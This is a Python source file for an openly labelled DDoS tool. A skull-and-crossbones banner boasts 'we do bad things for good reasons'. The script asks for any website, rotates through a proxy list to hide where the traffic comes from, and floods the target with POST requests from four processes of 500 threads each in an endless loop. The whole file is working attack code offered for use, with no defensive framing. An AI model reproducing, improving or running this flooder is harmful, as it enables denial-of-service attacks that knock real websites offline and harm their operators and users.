import threading
import multiprocessing
import requests
import os
import random
import time
from colorama import init, Fore, Style
from tqdm import tqdm

init(autoreset=True)

def logo():
    banner = r'''
        __________________________________________________
        |     xx      xx        \\     ________     //   |   
        |      xx    xx          \\  /          \  //    |
        |       xx  xx            \\/   (@) (@)  \//     |
        |       xx xx  <==MAN==>   \|      ^     |/      |
        |       xx  xx               \_./||||\._/        |       
        |      xx    xx             //\ \||||/ /\\       | 
        |     xx      xx           //  \______/  \\      |
        |    xx        xx         //              \\     |
        |___________________X5-BfG_______________________| 

           Reach us IG : xmanhacky ---  ☯️__X5 BfG__☯️

                            DDOS  TOOL
                we do bad things for good reasons 
    -------------------------------------------------------
        ⚠️ --> REMEMBER USING PROTECTION DUDE OTHERWISE 👮
        ⚠️ --> THIS TOOL REQUIRES HEAVY PROCESSORS      😭
        ⚠️ --> THE SIZE OF WORKING PROXIES.TXT MATTERS  🧠
    _______________________________________________________
    '''
    for line in banner.splitlines():
        print(Fore.RED + line)
        time.sleep(0.5)  # Adds delay to give it a more "hacker terminal" feel
    print('\n')

def hacky_timer(start_time, link):
    while True:
        elapsed_time = time.time() - start_time
        days, remainder = divmod(elapsed_time, 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        timer_str = (
            f"{Fore.LIGHTCYAN_EX}⟬☠️⟭> Time: {int(days)} days, "
            f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d} ⏳"
        )
        print(f"\r{timer_str}\n😜Ping >> [{link}] to find JOY", end="", flush=True)  # Use carriage return to overwrite the line
        time.sleep(1800)

def load_proxies_from_file(file_path='working_proxies.txt'):
    try:
        with open(file_path, 'r') as file:
            proxies = file.read().splitlines()
            print(f"[✔️] Loaded {len(proxies)} proxies from {file_path}\n")
            return proxies
    except FileNotFoundError:
        print(f"[❌] Proxy file {file_path} not found.\n")
        return []

# Adding progress bar and using cleaner output formatting
def send_request(link, proxy):

    url = f"https://{link}"
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Referer': f'https://{link}'
    }
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        response = requests.post(url, headers=headers, proxies=proxies, timeout=5)
        if response:
            if response.status_code == 200:
                print(f"⟬☠️⟭> {Fore.LIGHTCYAN_EX}{Style.BRIGHT}[{link}😭]-->Proxy [{proxy}] Got in Fully! 👹 \n")
            else:
                print(
                    f"⟬☠️⟭> {Fore.RED}[{link}😭]-->Proxy [{proxy}] failed 👎")#with status code: {response.status_code}\n")
        else:
            print(f"⟬☠️⟭> {Fore.LIGHTGREEN_EX}[{link}😭]-->Proxy [{proxy}] Succeeded No Response 🔥\n")
    except requests.RequestException:
        #print(f"⟬☠️⟭> {Fore.GREEN}[{link}😭]-->Proxy [{proxy}] Wait i Got it! 🔥\n")
        pass

def load_test(link, proxies, num_threads):
    progress = tqdm(total=num_threads, desc="🔥 Attacking", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}\n")
    while True:
        for _ in range(num_threads):
            proxy = random.choice(proxies)
            thread = threading.Thread(target=send_request, args=(link, proxy))
            thread.start()
            progress.update(1)
        progress.close()

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def terminate_all_processes(processes):
    print(f"{Fore.GREEN}\n⟬☠️⟭> Terminating all processes...")
    for process in processes:
        process.terminate()  # Terminate all running processes
        process.join()  # Ensure they are fully stopped
    print(f"{Fore.RED}⟬☠️⟭> All processes terminated.")

def main():
    logo()

    link = input("⟬☠️⟭>>Enter the Website link [e.g example.com]:  ")
    if not link.endswith((".com", ".in", ".net")):
        clear_screen()
        logo()

    if input("⟬☠️⟭>>You sure you wanna do this? (y/n): ").strip().lower() != 'y':
        return

    proxies = load_proxies_from_file('working_proxies.txt')
    if not proxies:
        return
    # Start the hacky timer in a separate thread after user confirmation
    start_time = time.time()
    timer_thread = threading.Thread(target=hacky_timer, args=(start_time,link), daemon=True)
    timer_thread.start()

    processes = []

    try:
        num_processes = 4
        num_threads_per_process = 500
        print(
            f"{Fore.CYAN}😁 Starting Stress Load <{num_processes}> attacks and <{num_threads_per_process}> army count each attack ...\n")

        # Start multiple processes for the load test
        for _ in range(num_processes):
            process = multiprocessing.Process(target=load_test, args=(link, proxies, num_threads_per_process))
            process.start()
            processes.append(process)

        # Wait for all processes to complete
        for process in processes:
            process.join()

    except KeyboardInterrupt:
        print(f"{Fore.GREEN}\n⟬☠️⟭> Attack terminated by user (Ctrl+C). Exiting...\n")
        terminate_all_processes(processes)  # Terminate all child processes when interrupted

    finally:
        if processes:
            terminate_all_processes(processes)  # Ensure clean termination on exit

if __name__ == "__main__":
    main()
